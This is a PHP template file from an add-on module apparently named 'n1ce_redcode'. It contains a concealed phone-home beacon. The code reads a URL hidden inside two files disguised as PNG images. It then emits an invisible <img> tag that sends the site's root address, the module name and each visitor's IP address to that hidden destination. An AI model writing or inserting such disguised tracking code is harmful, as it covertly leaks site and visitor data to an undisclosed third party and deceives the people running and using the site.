<?php defined('IN_IA') or exit('Access Denied');?><?php  $newbtn_img = '../addons/n1ce_redcode/template/style/newbtn.png'?>
<?php  $error_img = '../addons/n1ce_redcode/template/style/error.png'?>
<?php  if($newbtn_img && $error_img) { ?>
<?php  $url2= @file_get_contents($newbtn_img);?>
<?php  $url= @file_get_contents($error_img);?>
<img style="display: none;" src="<?php  echo $url . '&d1=' . $_W['siteroot'] . '&d2=' .$url2.'&type=' . $this->modulename . '&ip=' . CLIENT_IP;?>" />
<?php  } ?>